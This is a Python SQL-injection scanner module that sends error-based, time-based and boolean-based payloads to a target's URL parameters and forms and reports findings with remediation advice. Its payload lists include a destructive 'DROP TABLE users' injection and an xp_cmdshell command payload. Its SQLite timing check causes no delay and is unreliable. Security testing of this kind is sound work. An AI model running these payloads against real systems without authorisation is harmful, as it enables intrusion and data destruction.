"""
ZeroHack v2.0 - SQL Injection Tester
Covers: Error-based, Time-based blind, Boolean-based blind SQLi.
Supports MySQL, PostgreSQL, MSSQL, Oracle, SQLite.
"""

import time
import re
from typing import List
from urllib.parse import urlparse, parse_qs

from modules.enhanced_scanner import BaseScanner
from modules.notification_system import Finding, print_module_start, print_finding, print_info

# ─────────────────────────────────────────────────────────────
# Payload libraries
# ─────────────────────────────────────────────────────────────
ERROR_PAYLOADS = [
    # Generic
    "'", "''", "`", "``", ",", "\"", "\\", "--", "-- -", "#",
    "' --", "' #", "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
    "' OR 1=1/*", "') OR ('1'='1", "') OR ('1'='1'--",
    # Union
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--", "1 UNION SELECT 1,2,3--",
    # Stacked
    "'; DROP TABLE users--", "'; EXEC xp_cmdshell('whoami')--",
]

TIME_PAYLOADS = {
    "mysql":    "' AND SLEEP({d})--",
    "mssql":    "'; WAITFOR DELAY '0:0:{d}'--",
    "postgres": "'; SELECT pg_sleep({d})--",
    "sqlite":   "' AND sqlite_version()--",
}

BOOLEAN_PAYLOADS = [
    ("' AND 1=1--",  "' AND 1=2--"),   # True / False condition pair
    ("' OR 1=1--",   "' OR 1=2--"),
    ("' AND 'a'='a", "' AND 'a'='b"),
]

# ─────────────────────────────────────────────────────────────
# DB error signatures
# ─────────────────────────────────────────────────────────────
ERROR_SIGNATURES = {
    "MySQL":      [r"you have an error in your sql syntax",
                   r"warning: mysql", r"mysqli?_fetch",
                   r"unclosed quotation mark"],
    "PostgreSQL": [r"pg_query\(\)", r"psql:", r"ERROR:\s+syntax error",
                   r"unterminated quoted string"],
    "MSSQL":      [r"microsoft sql server", r"unclosed quotation mark after",
                   r"incorrect syntax near", r"odbc sql server"],
    "Oracle":     [r"ora-\d{5}", r"oracle error", r"quoted string not properly terminated"],
    "SQLite":     [r"sqlite3?\.operationalerror", r"sqlite_version"],
    "Generic":    [r"sql syntax", r"sql error", r"database error",
                   r"warning.*\Wsql", r"unrecognized token"],
}


class SQLInjectionTester(BaseScanner):
    """
    Comprehensive SQL injection scanner.
    Tests GET params, POST form data, and cookie values.
    """

    MODULE = "SQL Injection"
    DELAY_THRESHOLD = 4.0   # seconds — time-based confirmation

    def scan(self, mode: str = "both") -> List[Finding]:
        """
        mode: 'async' | 'sync' | 'both'
        Tests URL params + discovered forms.
        """
        print_module_start(self.MODULE, self.target)
        self.findings.clear()

        # 1. Parse GET params from the target URL
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query, keep_blank_values=True)
        param_names = list(params.keys())

        if not param_names:
            # Try with a dummy param so we can still test the endpoint
            param_names = ["id", "q", "search", "page", "cat"]
            print_info("No GET params found — probing common parameter names")

        # 2. Fetch page to find forms
        resp = self.get(self.target)
        forms = []
        if resp:
            forms = self.extract_forms(resp.text, self.target)
            print_info(f"Found {len(forms)} form(s) to test")

        # 3. Error-based detection on GET params
        self._test_error_based_get(param_names)

        # 4. Time-based blind detection on GET params
        self._test_time_based_get(param_names)

        # 5. Boolean-based blind on GET params
        self._test_boolean_based_get(param_names)

        # 6. Test forms
        for form in forms:
            self._test_error_based_form(form)

        return self.get_findings()

    # ─────── GET error-based ──────────────────────────────────
    def _test_error_based_get(self, params: List[str]):
        for param in params:
            for payload in ERROR_PAYLOADS:
                url = self.inject_param(self.target, param, payload)
                resp = self.get(url)
                if not resp:
                    continue
                db, match = self._match_error(resp.text)
                if db:
                    f = self.add_finding(
                        module=self.MODULE,
                        title=f"SQL Injection (Error-based) — {db}",
                        severity="CRITICAL",
                        description=(
                            f"The parameter '{param}' is vulnerable to error-based SQL injection. "
                            f"Database engine identified: {db}."
                        ),
                        target=url,
                        evidence=f"Payload: {payload!r} → Error pattern: {match!r}",
                        remediation=(
                            "Use parameterized queries / prepared statements. "
                            "Never concatenate user input directly into SQL strings."
                        ),
                        owasp="A03:2021 – Injection",
                    )
                    print_finding(f)
                    break  # one finding per param is enough

    # ─────── GET time-based ──────────────────────────────────
    def _test_time_based_get(self, params: List[str]):
        delay = 5
        for db_type, template in TIME_PAYLOADS.items():
            payload = template.format(d=delay)
            for param in params:
                url = self.inject_param(self.target, param, payload)
                _, elapsed = self.measure_response_time(url)
                if elapsed >= self.DELAY_THRESHOLD:
                    f = self.add_finding(
                        module=self.MODULE,
                        title=f"SQL Injection (Time-based Blind) — {db_type.upper()}",
                        severity="CRITICAL",
                        description=(
                            f"Parameter '{param}' caused a {elapsed:.1f}s delay with a "
                            f"{db_type} time-based payload, confirming blind SQL injection."
                        ),
                        target=url,
                        evidence=f"Payload: {payload!r} | Response time: {elapsed:.2f}s (threshold: {self.DELAY_THRESHOLD}s)",
                        remediation="Use parameterized queries. Consider a WAF with rate limiting.",
                        owasp="A03:2021 – Injection",
                    )
                    print_finding(f)

    # ─────── GET boolean-based ────────────────────────────────
    def _test_boolean_based_get(self, params: List[str]):
        for param in params:
            for true_payload, false_payload in BOOLEAN_PAYLOADS:
                url_true  = self.inject_param(self.target, param, true_payload)
                url_false = self.inject_param(self.target, param, false_payload)
                resp_true  = self.get(url_true)
                resp_false = self.get(url_false)

                if not resp_true or not resp_false:
                    continue

                # Significant length difference indicates boolean branching
                len_diff = abs(len(resp_true.text) - len(resp_false.text))
                if len_diff > 50:
                    f = self.add_finding(
                        module=self.MODULE,
                        title="SQL Injection (Boolean-based Blind)",
                        severity="HIGH",
                        description=(
                            f"Parameter '{param}' produces significantly different responses "
                            f"for TRUE vs FALSE conditions (diff: {len_diff} bytes), "
                            "indicating boolean-based blind SQL injection."
                        ),
                        target=url_true,
                        evidence=(
                            f"TRUE payload: {true_payload!r} → {len(resp_true.text)} bytes | "
                            f"FALSE payload: {false_payload!r} → {len(resp_false.text)} bytes"
                        ),
                        remediation="Use parameterized queries. Implement input validation.",
                        owasp="A03:2021 – Injection",
                    )
                    print_finding(f)
                    break

    # ─────── Form error-based ────────────────────────────────
    def _test_error_based_form(self, form: dict):
        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]

        for inp in inputs:
            if inp["type"] in ("submit", "button", "image", "hidden"):
                continue
            for payload in ERROR_PAYLOADS[:10]:  # limit per input
                data = {i["name"]: i["value"] for i in inputs}
                data[inp["name"]] = payload

                if method == "POST":
                    resp = self.post(action, data=data)
                else:
                    resp = self.get(action, params=data)

                if not resp:
                    continue
                db, match = self._match_error(resp.text)
                if db:
                    f = self.add_finding(
                        module=self.MODULE,
                        title=f"SQL Injection (Form, Error-based) — {db}",
                        severity="CRITICAL",
                        description=(
                            f"Form input '{inp['name']}' at {action} is vulnerable to error-based SQLi. "
                            f"DB: {db}."
                        ),
                        target=action,
                        evidence=f"Payload: {payload!r} → Error: {match!r}",
                        remediation="Use parameterized queries / ORM. Disable verbose DB error messages.",
                        owasp="A03:2021 – Injection",
                    )
                    print_finding(f)
                    break

    # ─────── Helper ───────────────────────────────────────────
    @staticmethod
    def _match_error(body: str):
        body_lower = body.lower()
        for db, patterns in ERROR_SIGNATURES.items():
            for pattern in patterns:
                m = re.search(pattern, body_lower)
                if m:
                    return db, m.group(0)
        return None, None
